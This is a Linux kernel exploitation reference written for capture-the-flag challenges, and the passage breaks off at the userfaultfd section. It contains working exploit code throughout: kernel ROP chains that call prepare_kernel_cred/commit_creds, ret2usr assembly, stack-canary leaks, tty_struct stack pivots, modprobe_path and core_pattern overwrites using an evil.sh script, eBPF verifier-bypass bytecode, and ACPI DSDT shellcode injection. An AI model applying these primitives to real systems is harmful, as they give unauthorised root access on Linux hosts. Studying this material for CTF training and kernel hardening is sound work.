# Kernel Exploitation

## Table of Contents

- [Environment Setup and Recon](#environment-setup-and-recon)
  - [QEMU Debug Environment](#qemu-debug-environment)
  - [Extracting vmlinux](#extracting-vmlinux)
  - [Kernel Config Checks](#kernel-config-checks)
  - [FGKASLR Detection](#fgkaslr-detection)
- [Useful Kernel Structures for Heap Spray](#useful-kernel-structures-for-heap-spray)
  - [tty_struct (kmalloc-1024)](#tty_struct-kmalloc-1024)
  - [tty_file_private (kmalloc-32)](#tty_file_private-kmalloc-32)
  - [poll_list (kmalloc-32 to 1024)](#poll_list-kmalloc-32-to-1024)
  - [user_key_payload (kmalloc-32 to 1024)](#user_key_payload-kmalloc-32-to-1024)
  - [setxattr Temporary Buffer (kmalloc-32 to 1024)](#setxattr-temporary-buffer-kmalloc-32-to-1024)
  - [seq_operations (kmalloc-32)](#seq_operations-kmalloc-32)
  - [subprocess_info (kmalloc-128)](#subprocess_info-kmalloc-128)
- [Kernel Stack Overflow and Canary Leak](#kernel-stack-overflow-and-canary-leak)
- [Privilege Escalation Primitives](#privilege-escalation-primitives)
  - [ret2usr (No SMEP/SMAP)](#ret2usr-no-smepsmap)
  - [Kernel ROP with prepare_kernel_cred / commit_creds](#kernel-rop-with-prepare_kernel_cred-commit_creds)
  - [Saving and Restoring Userland State](#saving-and-restoring-userland-state)
- [modprobe_path Overwrite](#modprobe_path-overwrite)
  - [Technique Overview](#technique-overview)
  - [Bruteforce Without Leak](#bruteforce-without-leak)
  - [Checking CONFIG_STATIC_USERMODEHELPER](#checking-config_static_usermodehelper)
- [core_pattern Overwrite](#core_pattern-overwrite)
- [Kernel Heap Overflow via kmalloc Size Mismatch](#kernel-heap-overflow-via-kmalloc-size-mismatch)
- [eBPF Verifier Bypass Exploitation](#ebpf-verifier-bypass-exploitation)
- [User-Kernel-Hypervisor Chain via I/O Port Hypercalls](#user-kernel-hypervisor-chain-via-io-port-hypercalls)
- [ACPI DSDT Shellcode Injection for Privilege Escalation](#acpi-dsdt-shellcode-injection-for-privilege-escalation)
- [ARM fcntl64 set_fs() CVE-2015-8966 Pipe Exfil](#arm-fcntl64-set_fs-cve-2015-8966-pipe-exfil)
- [tty_struct RIP Hijack and kROP](#tty_struct-rip-hijack-and-krop)
  - [kROP via Fake Vtable on tty_struct](#krop-via-fake-vtable-on-tty_struct)
  - [AAW via ioctl Register Control](#aaw-via-ioctl-register-control)
- [userfaultfd Race Stabilization](#userfaultfd-race-stabilization)
  - [Alternative Race Techniques (uffd Disabled)](#alternative-race-techniques-uffd-disabled)
- [SLUB Allocator Internals](#slub-allocator-internals)
  - [Freelist Pointer Hardening](#freelist-pointer-hardening)
  - [Freelist Obfuscation (CONFIG_SLAB_FREELIST_HARDEN)](#freelist-obfuscation-config_slab_freelist_harden)
- [Leak via Kernel Panic](#leak-via-kernel-panic)
- [Race Window Extension via MADV_DONTNEED + mprotect](#race-window-extension-via-madv_dontneed-mprotect)
- [Cross-Cache Attack via CPU-Split Strategy](#cross-cache-attack-via-cpu-split-strategy)
- [PTE Overlap Primitive for File Write](#pte-overlap-primitive-for-file-write)
- [Kernel addr_limit Bypass via Failed File Open](#kernel-addr_limit-bypass-via-failed-file-open)
- [Custom binfmt Loader OOB Read + clear_user for Privesc](#custom-binfmt-loader-oob-read-clear_user-for-privesc)
- [KASLR and FGKASLR Bypass](#kaslr-and-fgkaslr-bypass)
  - [KASLR Bypass via Stack Leak](#kaslr-bypass-via-stack-leak)
  - [FGKASLR Bypass](#fgkaslr-bypass)
- [KPTI Bypass Methods](#kpti-bypass-methods)
  - [Method 1: swapgs_restore Trampoline](#method-1-swapgs_restore-trampoline)
  - [Method 2: Signal Handler (SIGSEGV)](#method-2-signal-handler-sigsegv)
  - [Method 3: modprobe_path via ROP](#method-3-modprobe_path-via-rop)
  - [Method 4: core_pattern via ROP](#method-4-core_pattern-via-rop)
- [SMEP / SMAP Bypass](#smep-smap-bypass)
- [KPTI / SMEP / SMAP Quick Reference](#kpti-smep-smap-quick-reference)
- [GDB Kernel Module Debugging](#gdb-kernel-module-debugging)
- [Initramfs and virtio-9p Workflow](#initramfs-and-virtio-9p-workflow)
- [Finding Symbol Offsets Without CONFIG_KALLSYMS_ALL](#finding-symbol-offsets-without-config_kallsyms_all)
- [Exploit Templates](#exploit-templates)
  - [Full Kernel ROP Template (SMEP + KPTI)](#full-kernel-rop-template-smep-kpti)
  - [ret2usr Template (No SMEP/SMAP)](#ret2usr-template-no-smepsmap)
- [Exploit Delivery](#exploit-delivery)

---

## Environment Setup and Recon

**Key insight:** Before writing any exploit, check the QEMU launch script for enabled mitigations (`smep`, `smap`, `kpti`, `kaslr`) and the `oops=panic` flag. These determine which exploitation techniques are viable. Disable all mitigations for initial debugging, then re-enable them one by one.

### QEMU Debug Environment

Standard QEMU launch script for kernel challenge debugging:

```bash
qemu-system-x86_64 \
  -kernel./bzImage \
  -initrd./rootfs.cpio \
  -nographic \
  -monitor none \
  -cpu qemu64 \
  -append "console=ttyS0 nokaslr panic=1" \
  -no-reboot \
  -s \
  -m 256M
```

- `-s` enables GDB on port 1234 (`target remote:1234`)
- `-append "nokaslr"` disables KASLR for debugging
- Check QEMU script for: `smep`, `smap`, `kaslr`, `oops=panic`, `kpti=1`
- If `oops=panic` is absent, kernel oops only kills the faulting process (exploitable for info leaks via dmesg)

**Disable mitigations for initial debugging** by modifying the launch script:
```bash
-append "console=ttyS0 nokaslr nopti nosmep nosmap quiet panic=1"
-cpu kvm64   # instead of kvm64,+smep,+smap
```

### Extracting vmlinux

**Extract vmlinux from bzImage:**
```bash
# Use extract-vmlinux.sh from Linux kernel source (scripts/extract-vmlinux)./extract-vmlinux./bzImage > vmlinux

# Extract ROP gadgets
ROPgadget -binary./vmlinux > gadgets.txt
```

### Kernel Config Checks

| Config | Effect | How to Check |
|-|-|-|
| SMEP/SMAP/KASLR/KPTI | CPU-level mitigations | Check QEMU run script `-cpu` and `-append` flags |
| FGKASLR | Per-function randomization | `readelf -S vmlinux` section count (see below) |
| `SLAB_FREELIST_RANDOM` | Randomized freelist order | Sequential allocations not adjacent |
| `SLAB_FREELIST_HARDEN` | XOR-obfuscated free pointers | Check freelist pointers in GDB |
| `STATIC_USERMODEHELPER` | Blocks `modprobe_path` overwrite | Disassemble `call_usermodehelper_setup` |
| `KALLSYMS_ALL` | `.data` symbols in `/proc/kallsyms` | `grep modprobe_path /proc/kallsyms` |
| `CONFIG_USERFAULTFD` | Enables userfaultfd syscall | Try calling it; disabled = -ENOSYS |
| eBPF (extended Berkeley Packet Filter) JIT | JIT-compiled BPF filters | `cat /proc/sys/net/core/bpf_jit_enable` (0=off, 1=on, 2=debug) |

Check oops behavior:
- `oops=panic` in QEMU `-append` -> oops causes full kernel panic
- Without it -> oops kills the faulting process only; dmesg may leak stack/heap/kbase pointers

### FGKASLR Detection

Fine-Grained KASLR randomizes each function independently. Detect by counting ELF sections:

```bash
readelf -S vmlinux | tail -5
# FGKASLR disabled: ~30 sections
# FGKASLR enabled:  36000+ sections (one per function)

file vmlinux
# FGKASLR enabled: "too many section (36140)"
```

---

## Useful Kernel Structures for Heap Spray

These structures are allocated from standard `kmalloc` caches and controlled from userspace. Use them to fill freed slots for UAF exploitation or to leak kernel pointers.

**Key insight:** Match the vulnerable object's `kmalloc` cache size to choose the right spray structure. For kmalloc-32, use `seq_operations` or `tty_file_private`; for kmalloc-1024, use `tty_struct`; for variable sizes (32-1024), use `poll_list`, `user_key_payload`, or `setxattr`.

| Structure | Cache | Alloc Trigger | Free Trigger | Use |
|-|-|-|-|-|
| `tty_struct` | kmalloc-1024 | `open("/dev/ptmx")` | `close(fd)` | kbase leak, RIP hijack |
| `tty_file_private` | kmalloc-32 | `open("/dev/ptmx")` | `close(fd)` | kheap leak (points to `tty_struct`) |
| `poll_list` | kmalloc-32~1024 | `poll(fds, nfds, timeout)` | `poll()` returns | kheap leak, arbitrary free |
| `user_key_payload` | kmalloc-32~1024 | `add_key()` | `keyctl_revoke()`+GC | arbitrary value write |
| `setxattr` buffer | kmalloc-32~1024 | `setxattr()` | same call path | momentary arbitrary value write |
| `seq_operations` | kmalloc-32 | `open("/proc/self/stat")` | `close(fd)` | kbase leak, RIP hijack |
| `subprocess_info` | kmalloc-128 | internal kernel | internal kernel | kbase leak, RIP hijack |

### tty_struct (kmalloc-1024)

Allocated when `open("/dev/ptmx")`, freed on `close()`. Size: 0x2B8 bytes.

```c
struct tty_struct {
    int magic;                    // +0x00: must be 0x5401 (paranoia check)
    struct kref kref;             // +0x04: reference count
    struct device *dev;           // +0x08
    struct tty_driver *driver;    // +0x10: must be valid kheap pointer
    const struct tty_operations *ops; // +0x18: vtable pointer -> kbase leak
    //...
};
```

- **kbase leak:** Read `tty_struct.ops` - points to `ptm_unix98_ops` (or similar) in kernel `.data`
- **RIP hijack:** Overwrite `tty_struct.ops` with pointer to fake vtable, then `ioctl()` calls `tty->ops->ioctl()`
- **magic** must remain `0x5401` or `tty_ioctl()` returns immediately (paranoia check)
- **driver** must be a valid kernel heap pointer or the kernel will oops

### tty_file_private (kmalloc-32)

Allocated alongside `tty_struct` in `tty_alloc_file()`. Size: 0x20 bytes.

```c
struct tty_file_private {
    struct tty_struct *tty;   // +0x00: pointer to tty_struct in kmalloc-1024
    struct file *file;        // +0x08
    struct list_head list;    // +0x10
};
```

- **kheap leak:** Read `tty_file_private.tty` to get address in `kmalloc-1024`

### poll_list (kmalloc-32 to 1024)

Allocated during `poll()`, freed when `poll()` completes (timer expiry or event trigger). Cache size depends on number of fds polled.

```c
struct poll_list {
    struct poll_list *next;   // +0x00: linked list pointer
    int len;                  // +0x08: number of entries
    struct pollfd entries[];  // +0x0C: variable-length array
};
```

- **Arbitrary free:** Overwrite `poll_list.next` -> when `poll()` finishes, it frees all entries in the linked list including the corrupted pointer -> UAF on arbitrary address

### user_key_payload (kmalloc-32 to 1024)

Allocated via `add_key()` syscall. Cache size depends on `data` length.

```c
struct user_key_payload {
    struct callback_head rcu;     // +0x00: 16 bytes, untouched until init
    unsigned short datalen;       // +0x10
    char data[];                  // +0x18: user-controlled content
};
```

- First 16 bytes are uninitialized until GC callback - combine with UAF to leak residual heap data
- Free requires `keyctl_revoke()` then wait for GC
- Blocked by default Docker seccomp profile

### setxattr Temporary Buffer (kmalloc-32 to 1024)

`setxattr("file", "user.x", data, size, XATTR_CREATE)` allocates a buffer, copies user data, then frees it in the same call path.

- **Momentary write:** Combine with uninitialized structs to write arbitrary values into freed chunks
- Cannot be used for persistent spray (freed immediately)
- The file passed to `setxattr()` must exist - common pitfall when exploit runs from different directory than expected

### seq_operations (kmalloc-32)

Allocated when opening `/proc/self/stat` (or similar seq_file). Contains function pointers for kbase leak.

### subprocess_info (kmalloc-128)

Internal kernel struct with function pointers. Useful for kbase leak and RIP hijack in specific scenarios.

---

## Kernel Stack Overflow and Canary Leak

Kernel modules with vulnerable read/write handlers often allow stack buffer overflow. The exploitation pattern mirrors userland stack overflows but with kernel-specific register state management.

**Canary leak via oversized read:**

A vulnerable `hackme_read()` copies from a 32-element stack array `tmp[32]` but allows reading up to 0x1000 bytes - leaking the stack canary and kernel text pointers beyond the buffer.

```c
unsigned long leak[40];
int fd = open("/dev/hackme", O_RDWR);

// Read beyond stack buffer to leak canary + kernel pointers
read(fd, leak, sizeof(leak));

// Stack layout: tmp[32] at rbp-0x98, canary at rbp-0x18
// Canary at index 16 (offset 0x80 from buffer start)
unsigned long cookie = leak[16];

// Kernel text pointer at index 38 -> compute KASLR base
unsigned long kernel_base = (leak[38] & 0xffffffffffff0000);
long kaslr_offset = kernel_base - 0xffffffff81000000;
```

**Stack overflow payload structure:**

```c
unsigned long payload[50];
int off = 16;                    // offset to canary position
payload[off++] = cookie;         // canary
payload[off++] = 0x0;            // padding (rbx)
payload[off++] = 0x0;            // padding (r12)
payload[off++] = 0x0;            // saved rbp
payload[off++] = rop_start;      // return address -> ROP chain
//... ROP chain follows...
write(fd, payload, sizeof(payload));
```

**ioctl-based size check bypass:**

Some modules gate write length against a global `MaxBuffer` variable that is itself controllable via `ioctl()`:

```c
// Vulnerable pattern in module:
// swrite() checks: if (MaxBuffer < user_size) return -EFAULT;
// sioctl() with cmd 0x20: MaxBuffer = (int)arg;  <- attacker-controlled

// Exploit: increase MaxBuffer before overflow
int fd = open("/proc/pwn_device", O_RDWR);
ioctl(fd, 0x20, 300);            // set MaxBuffer to 300 (buffer is only 128)
write; // now passes size check -> stack overflow
```

**Key insight:** Kernel stack canaries work identically to userland canaries. A vulnerable read handler that copies more bytes than the buffer size leaks the canary and saved registers, including kernel text pointers for KASLR bypass. Look for `ioctl` handlers that modify global variables used in bounds checks - they often bypass write size restrictions.

---

## Privilege Escalation Primitives

### ret2usr (No SMEP/SMAP)

When SMEP and SMAP are disabled, the kernel can directly execute userland code and access userland memory. Hijack RIP to a userland function that calls `prepare_kernel_cred(0)` and `commit_creds()`.

```c
// Addresses from /proc/kallsyms (or leak)
unsigned long prepare_kernel_cred = 0xffffffff814c67f0;
unsigned long commit_creds       = 0xffffffff814c6410;

// Saved userland state for iretq return
unsigned long user_cs, user_ss, user_sp, user_rflags, user_rip;

void privesc() {
    __asm__(".intel_syntax noprefix;"
        "movabs rax, %[prepare_kernel_cred];"
        "xor rdi, rdi;"        // prepare_kernel_cred(NULL) -> init cred
        "call rax;"
        "mov rdi, rax;"        // commit_creds(new_cred)
        "movabs rax, %[commit_creds];"
        "call rax;"
        "swapgs;"              // restore GS base for userland
        "mov r15, %[user_ss];   push r15;"
        "mov r15, %[user_sp];   push r15;"
        "mov r15, %[user_rflags]; push r15;"
        "mov r15, %[user_cs];   push r15;"
        "mov r15, %[user_rip];  push r15;"
        "iretq;"               // return to userland as root
        ".att_syntax;":: [prepare_kernel_cred] "r"(prepare_kernel_cred),
            [commit_creds] "r"(commit_creds),
            [user_ss] "r"(user_ss), [user_sp] "r"(user_sp),
            [user_rflags] "r"(user_rflags),
            [user_cs] "r"(user_cs), [user_rip] "r"(user_rip));
}
```

After `privesc()` returns to userland, the process has root credentials. Call `system("/bin/sh")` to get a root shell.

### Kernel ROP with prepare_kernel_cred / commit_creds

When SMEP is enabled, build a kernel ROP chain to call `prepare_kernel_cred(0)` -> pass result to `commit_creds()` -> return to userland.

```c
// Find gadgets: ropr -no-uniq -R "^pop rdi; ret;|^mov rdi, rax"./vmlinux
unsigned long pop_rdi_ret = 0xffffffff81006370;
unsigned long mov_rdi_rax_pop1_ret = 0xffffffff816bf740; // mov rdi, rax;...; pop rbx; ret
unsigned long swapgs_pop1_ret = 0xffffffff8100a55f;      // swapgs; pop rbp; ret
unsigned long iretq = 0xffffffff8100c0d9;

unsigned long payload[50];
int off = 16;   // canary offset
payload[off++] = cookie;
payload[off++] = 0;           // rbx
payload[off++] = 0;           // r12
payload[off++] = 0;           // rbp

// ROP chain: prepare_kernel_cred(0) -> commit_creds(result)
payload[off++] = pop_rdi_ret;
payload[off++] = 0x0;                      // rdi = NULL
payload[off++] = prepare_kernel_cred;
payload[off++] = mov_rdi_rax_pop1_ret;     // rdi = rax (new cred)
payload[off++] = 0x0;                      // pop rbx padding
payload[off++] = commit_creds;

// Return to userland
payload[off++] = swapgs_pop1_ret;
payload[off++] = 0x0;                      // pop rbp padding
payload[off++] = iretq;
payload[off++] = user_rip;                 // spawn_shell
payload[off++] = user_cs;                  // 0x33
payload[off++] = user_rflags;
payload[off++] = user_sp;
payload[off++] = user_ss;                  // 0x2b
```

**Critical gadget: `mov rdi, rax`** - needed to pass the return value of `prepare_kernel_cred()` (in RAX) to `commit_creds()` (expects argument in RDI). Search for variants like `mov rdi, rax;...; ret` that may clobber other registers.

**Tool:** `ropr` is faster than ROPgadget for large kernel images:
```bash
ropr -no-uniq -R "^pop rdi; ret;|^mov rdi, rax|^swapgs|^iretq"./vmlinux
```

### Saving and Restoring Userland State

Before triggering the kernel exploit, save userland register state for the `iretq` return:

```c
unsigned long user_cs, user_ss, user_sp, user_rflags, user_rip;

void save_userland_state() {
    __asm__(".intel_syntax noprefix;"
        "mov %[cs], cs;"
        "mov %[ss], ss;"
        "mov %[sp], rsp;"
        "pushf; pop %[rflags];"
        ".att_syntax;": [cs] "=r"(user_cs), [ss] "=r"(user_ss),
          [sp] "=r"(user_sp), [rflags] "=r"(user_rflags));
    user_rip = (unsigned long)spawn_shell;  // function to call after return
}

void spawn_shell() {
    if (getuid() == 0) {
        printf("[+] root!\n");
        system("/bin/sh");
    } else {
        printf("[-] privesc failed\n");
        exit(1);
    }
}
```

**Register values (x86_64 userland):**
- `CS` = 0x33 (64-bit user code segment)
- `SS` = 0x2b (64-bit user stack segment)
- `RSP` = current userland stack pointer
- `RFLAGS` = current flags register
- `RIP` = address of post-exploit function (e.g., `spawn_shell`)

---

## modprobe_path Overwrite

### Technique Overview

Overwrite the global `modprobe_path` variable (default: `"/sbin/modprobe"`) with a path to an attacker-controlled script. When the kernel encounters a binary with an unknown format, it executes `modprobe_path` as root.

**Requirements:**
1. Arbitrary Address Write (AAW) to overwrite `modprobe_path`
2. Ability to create two files: a malformed binary and an evil script
3. `CONFIG_STATIC_USERMODEHELPER` is disabled

**Steps:**

```bash
# 1. Write evil script
echo '#!/bin/sh' > /tmp/evil.sh
echo 'cat /flag > /tmp/output' >> /tmp/evil.sh
echo 'chmod 777 /tmp/output' >> /tmp/evil.sh
chmod +x /tmp/evil.sh

# 2. Overwrite modprobe_path with "/tmp/evil.sh" using your AAW primitive

# 3. Create and execute a malformed binary (non-printable first 4 bytes)
echo -ne '\xff\xff\xff\xff' > /tmp/trigger
chmod +x /tmp/trigger
/tmp/trigger

# 4. Read the flag
cat /tmp/output
```

**How it works:** `execve()` -> `search_binary_handler()` -> no format matches -> `request_module("binfmt-XXXX")` -> `call_modprobe()` -> executes `modprobe_path` as root.

**Key insight:** The first 4 bytes of the trigger binary must be non-printable (not ASCII without tab/newline). If they are printable, the kernel skips the `request_module()` call.

### Bruteforce Without Leak

`modprobe_path` has only 1 byte of entropy under KASLR (the randomized page offset). With AAW, brute-force the address:

```python
# modprobe_path base address (from debugging without KASLR)
MODPROBE_BASE = 0xffffffff8265ff00
# Under KASLR, only the 0x65 byte varies
# Try 256 offsets
for byte_guess in range(256):
    addr = (MODPROBE_BASE & ~0xFF0000) | (byte_guess << 16)
    write_string(addr, "/tmp/evil.sh")
    trigger_modprobe()
```

### Checking CONFIG_STATIC_USERMODEHELPER

If enabled, `call_usermodehelper_setup()` ignores `modprobe_path` and uses a hardcoded constant.

**Detection via disassembly:**

```bash
# 1. Get function address
cat /proc/kallsyms | grep call_usermodehelper_setup

# 2. Set GDB breakpoint and trigger
echo -ne '\xff\xff\xff\xff' > /tmp/nirugiri && chmod +x /tmp/nirugiri && /tmp/nirugiri

# 3. In GDB, disassemble and check:
# NOT set: rdi saved into r14 at +9, used at +127 -> modprobe_path passed through
# SET: immediate constant at +122 instead of r14 -> 1st arg (modprobe_path) ignored
```

**When set:** `sub_info->path = CONFIG_STATIC_USERMODEHELPER_PATH` (constant). Overwriting `modprobe_path` has no effect. Look for alternative LPE techniques.

---

## core_pattern Overwrite

Alternative to `modprobe_path`. Overwrite `/proc/sys/kernel/core_pattern` (or the internal `core_pattern` variable) with a pipe command. When a process crashes, the kernel executes the specified command as root to handle the core dump.

```bash
# core_pattern with pipe: first char '|' means execute as command
# Overwrite core_pattern to: "|/tmp/evil.sh"
# Then crash a process to trigger
```

**Finding the offset:** `core_pattern` is not exported via `/proc/kallsyms` without `CONFIG_KALLSYMS_ALL`. To find it:

1. Set breakpoint on `override_creds()` (called by `do_coredump()`)
2. Crash a process: `int main() { ((void(*)())0)(); }`
3. After `override_creds` returns, disassemble - look for `movzx` loading from a data address
4. That address is `core_pattern`

**Key insight:** `core_pattern` is an alternative to `modprobe_path` when `CONFIG_STATIC_USERMODEHELPER` blocks modprobe. Overwrite it with `|/tmp/evil.sh` and crash any process to trigger root command execution. Finding the address requires a GDB breakpoint on `override_creds` during a deliberate crash since `core_pattern` is not always exported in `/proc/kallsyms`.

```text
(gdb) finish
(gdb) x/5i $rip
=> 0xffffffff811b1e98:  movzx r13d, BYTE PTR [rip+0xcfec80]  # 0xffffffff81eb0b20
(gdb) x/s 0xffffffff81eb0b20
0xffffffff81eb0b20: "core"
```

---

## Kernel Heap Overflow via kmalloc Size Mismatch

**Pattern:** Kernel module allocates `kmalloc(content_length)` but copies `0x40 + content_length` bytes (header + body), causing a 0x40-byte heap overflow into adjacent slab objects.

```c
// Vulnerable pattern in kernel HTTP handler:
buf = kmalloc(content_length, GFP_KERNEL);
memcpy(buf, http_header, 0x40);           // 0x40 bytes of header
memcpy(buf + 0x40, body, content_length); // Overflow!
```

**Exploitation:**
1. **Slab spray:** Open 1021 file descriptors (`open("/dev/kmalloc_target")`) to fill the kmalloc-256 slab cache
2. **Create holes:** Close 3 files to create gaps in the slab for the overflowing allocation
3. **Trigger overflow:** Send HTTP request with body that overflows into adjacent `struct file`
4. **Corrupt `f_op`:** Overwrite the `f_op` (file operations) pointer in the adjacent `struct file` to redirect function pointers
5. **Hijack write handler:** `f_op->write` now points to attacker-controlled address → `commit_creds(prepare_kernel_cred(0))`

**Key insight:** `struct file` is in kmalloc-256 and contains `f_op` (function pointer table). Corrupting `f_op` to a fake vtable gives control over any file operation (`read`, `write`, `ioctl`). The attacker triggers the hijacked operation via the corrupted file descriptor.

---

## eBPF Verifier Bypass Exploitation

Exploit mismatches between the eBPF verifier's static analysis and runtime behavior to achieve arbitrary kernel read/write.

```c
// Pattern: Verifier tracks register states differently from hardware
// Example: Right-shift desynchronization
// Verifier thinks: shr reg, 64 -> reg = 0
// Hardware does:   shr reg, 64 -> reg = original_value (shift >= width = undefined)

// Step 1: Create desynchronized register
BPF_ALU64_IMM(BPF_RSH, BPF_REG_7, 64),  // verifier: R7=0, runtime: R7=1

// Step 2: Use desync to bypass ALU sanitizer
BPF_ALU64_IMM(BPF_MUL, BPF_REG_7, offset),  // verifier: 0*offset=0, runtime: 1*offset=offset

// Step 3: Add to map pointer for OOB access
BPF_ALU64_REG(BPF_ADD, BPF_REG_0, BPF_REG_7),  // verifier allows (adding 0)
// Runtime: map_ptr + offset -> arbitrary kernel memory access

// Step 4: Read/write kernel memory, overwrite modprobe_path or cred struct
```

```bash
# eBPF exploitation workflow:
# 1. Find verifier vs runtime mismatch (RSH, bounds tracking, helper params)
# 2. Create register with verifier_value != runtime_value
# 3. Use desync register to bypass pointer arithmetic checks
# 4. Achieve arbitrary read via map value OOB
# 5. Leak kernel base from adjacent slab objects
# 6. Arbitrary write to modprobe_path or current->cred

# Helper function overflow variant (d3bpf-v2):
# bpf_skb_load_bytes(skb, offset, stack_buf, len)
# Verifier checks len <= 512, but desync makes runtime len huge
# Stack buffer overflow -> ROP to commit_creds(init_cred)

# KASLR bypass via eBPF:
# Trigger controlled oops -> dmesg leaks kernel addresses
# Or: read adjacent slab objects containing kernel pointers
```

**Key insight:** eBPF verifier bugs create a "type confusion" between static analysis and runtime. The pattern is always: (1) find operation where verifier prediction differs from hardware, (2) multiply the difference to create useful offsets, (3) add to map pointer for kernel memory access. Check kernel changelogs for eBPF verifier patches - each patch implies a prior exploitable bug.

---

## User-Kernel-Hypervisor Chain via I/O Port Hypercalls

**Pattern:** A three-layer challenge (user.elf → kernel.bin → hypervisor) restricts direct hypercalls from userspace via a whitelist enforced in kernel.bin. The attacker (1) corrupts a RPN-calculator user-mode program to write arbitrary bytes into its GOT, (2) uses that write to break out to kernel mode, and (3) from kernel mode issues a hypercall directly by executing `out dx, eax` on I/O ports `0x8000..0x80FF`, which the hypervisor handles as a syscall dispatch. The final twist: the hypervisor only accepts strings that already live in kernel memory, so a deliberately failing `open()` syscall is used to seed a kernel buffer with the target path before re-invoking the hypercall with that buffer address.

```asm; Kernel-mode stub running inside kernel.bin after the pivot
mov dx, 0x8000 + 5; I/O port = base + syscall_number (here: open)
mov eax, <kernel_buffer>; pointer that lives in kernel memory
out dx, eax; hypervisor reads from the port as an arg

mov dx, 0x8000 + 0; syscall 0 = read
mov eax, flag_buffer
out dx, eax
```

```python
# User-mode payload that pivots into kernel.bin via GOT overwrite
from pwn import *
io = remote

# 1. RPN-calc overwrites got['strtol'] with a kernel gadget that calls the
#    privileged hypercall stub.
payload = rpn_overwrite(target="strtol",
                        value=kernel_gadget_address)
io.sendline(payload)

# 2. Kernel stub runs the I/O-port sequence above and writes the flag back.
io.recvuntil(b"flag{")
log.success(b"flag{" + io.recvuntil(b"}"))
```

**Key insight:** The more privilege rings a challenge stacks, the more important it is to map *where data must live* versus *where code must run*. Abyss enforced a kernel whitelist on userspace hypercalls, but kernel code itself could still poke the hypervisor ports directly. The same pattern recurs in real VM escapes: a guest kernel primitive plus an I/O-port write reaches the VMM without going through the guest's own syscall table. When attacking `kvm_guest_enter` style hypervisors, look for memory-mapped I/O regions or port ranges that the VMM traps — they are hypercalls in disguise and often lack the argument sanitisation that formal hypercall interfaces require.

---

## ACPI DSDT Shellcode Injection for Privilege Escalation

**Pattern:** "Green Computing" style challenges boot a kernel with attacker-controlled ACPI tables. Embed shellcode inside a DSDT `OperationRegion(SystemMemory,...)` and write it into kernel memory with a `Field` write at boot. Patch a target like `commit_creds` so any subsequent setuid call elevates privileges.

```asl
OperationRegion (PWDN, SystemMemory, 0x1241000, 0x400)
Field (PWDN, AnyAcc, NoLock, Preserve) { JMPA, 0x400 }
JMPA = Buffer () { 0x41, 0x55, 0x41, 0x54, 0x48, /* shellcode */ }

OperationRegion (NISC, SystemMemory, 0x104ac24, 96)
Field (NISC, AnyAcc, NoLock, Preserve) { NICD, 768 }
NICD = Buffer () { 0x48, 0xc7, 0xc0, /* patched commit_creds prologue */ }
```

**Key insight:** ACPI AML runs with direct physical memory access before normal kernel protections are active. When the challenge lets you supply DSDT/SSDT bytes, `SystemMemory` `OperationRegion` is a kernel-write primitive bigger than most explicit kernel bugs.

---

## ARM fcntl64 set_fs() CVE-2015-8966 Pipe Exfil

**Legacy** (pre-set_fs removal; historically ARM Linux < ~5.10 and any residual builds still shipping `set_fs`). **Pattern:** Bug: `fcntl64` on ARM Linux set `KERNEL_DS` via `set_fs()` and never restored it. Exploit: fork a child that calls `fcntl64`, then have the child write arbitrary kernel addresses through a pipe; parent reads the pipe back. Direct reads of MMU regions panic, so pipes act as a safe shim.

```c
if (fork() == 0) {
    trigger_fcntl64_bug();                // now at KERNEL_DS
    write(pipe_w, (void*)kernel_addr, N); // unchecked kernel read
    _exit(0);
}
read(pipe_r, leak, N);                    // parent gets kernel memory
```

After leaking the cred struct, rewrite `uid/gid/euid/egid = 0` in place and call `getuid()` to confirm root.

**Key insight:** Missing `set_fs(USER_DS)` restoration is a single-line bug that gives unbounded copy_from/to_user with kernel addresses. Wrap dangerous reads through a pipe so the kernel copy loop never touches forbidden MMU regions directly.

---

## tty_struct RIP Hijack and kROP

### kROP via Fake Vtable on tty_struct

With sequential write over `tty_struct` (at least 0x200 bytes), build a two-phase kROP chain entirely within the structure:

```text
tty_struct layout for kROP:
  +0x00: magic, kref   -> 0x5401 (preserve paranoia check)
  +0x08: dev            -> addr of `pop rsp` gadget (return addr after `leave`)
  +0x10: driver         -> &tty_struct + 0x170 (stack pivot target; must be valid kheap addr)
  +0x18: ops            -> &tty_struct + 0x50 (pointer to fake vtable)...
  +0x50:                -> fake vtable (0x120 bytes), ioctl entry points to `leave` gadget...
  +0x170:               -> actual ROP chain (commit_creds, prepare_kernel_cred, etc.)
```

**Execution flow:**
1. `ioctl(ptmx_fd, cmd, arg)` -> `tty_ioctl()` -> paranoia check passes (magic=0x5401)
2. `tty->ops->ioctl()` -> jumps to `leave` gadget at fake vtable
3. `leave` = `mov rsp, rbp; pop rbp` - RBP points to `tty_struct` itself
4. RSP now points to `tty_struct + 0x08` (the `dev` field)
5. `ret` to `pop rsp` gadget at `dev`, pops `driver` as new RSP
6. RSP now at `tty_struct + 0x170` -> actual ROP chain runs

**Key insight:** RBP points to `tty_struct` at the time of the vtable call. The `leave` instruction pivots the stack into the structure itself, enabling a two-phase bootstrap: first `leave` to enter the structure, then `pop rsp` to jump to the ROP chain area.

**Alternative:** The gadget `push rdx;... pop rsp;... ret` at a fixed offset in many kernels enables direct stack pivot via `ioctl`'s 3rd argument (RDX is fully controlled):

```c
// ioctl(fd, cmd, arg) -> RDX = arg (64-bit controlled)
// Gadget: push rdx; mov ebp, imm; pop rsp; pop r13; pop rbp; ret
// Effect: RSP = arg -> ROP chain at user-specified address
ioctl(ptmx_fd, 0, (unsigned long)rop_chain_addr);
```

### AAW via ioctl Register Control

When full kROP is not needed, use `tty_struct` for Arbitrary Address Write (AAW) to overwrite `modprobe_path`:

Register control from `ioctl(fd, cmd, arg)`:
- `cmd` (32-bit) -> partial control of RBX, RCX, RSI
- `arg` (64-bit) -> full control of RDX, R8, R12

Write gadget in fake vtable: `mov DWORD PTR [rdx], esi; ret`

```c
// Repeated ioctl calls write 4 bytes at a time to modprobe_path
for (int i = 0; i < 4; i++) {
    uint32_t val = *(uint32_t*)("/tmp/evil.sh\0\0\0\0" + i*4);
    ioctl(ptmx_fd, val, modprobe_path_addr + i*4);
}
```

---

## userfaultfd Race Stabilization

`userfaultfd` (uffd) makes kernel race conditions deterministic by pausing execution at page faults.

**How it works:**
1. `mmap()` a region with `MAP_PRIVATE` (no physical pages allocated)
2. Register the region with `userfaultfd` via `ioctl(UFFDIO_REGISTER)`
3. When the kernel accesses this region (e.g., during `copy_from_user()`), a page fault occurs
4. The faulting kernel thread blocks until userspace handles the fault
5. During the block, the exploit modifies shared state (freeing objects, spraying heap, etc.)
6. Userspace resolves the fault via `ioctl(UFFDIO_COPY)`, kernel thread resumes

```c
// Setup
